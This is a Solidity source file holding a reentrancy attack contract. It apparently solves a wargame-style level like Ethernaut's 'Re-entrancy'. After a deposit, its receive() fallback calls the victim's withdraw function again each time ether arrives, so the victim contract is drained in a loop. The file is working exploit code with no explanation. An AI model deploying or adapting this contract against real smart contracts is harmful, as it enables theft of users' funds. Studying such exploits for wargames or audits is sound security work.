//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract Victim {
    function donate(address _to) public payable {}
    function balanceOf(address _who) public view returns (uint balance) {}
    function withdraw(uint _amount) public {}
}

contract Reentrance {

    uint public count;
    Victim v;

    event LogFallback(uint count, uint balance);

    constructor(address victim) {
        v = Victim(victim);
    }

    function donate() public payable {
        v.donate{value:msg.value}(address(this));
    }

    function getBalance() public view returns(uint) { return address(this).balance; }

    function attack() public {
        v.withdraw(10000000);
    }

    receive() payable external {
        count++;
        emit LogFallback(count, address(this).balance);
        v.withdraw(10000000);
    }
}
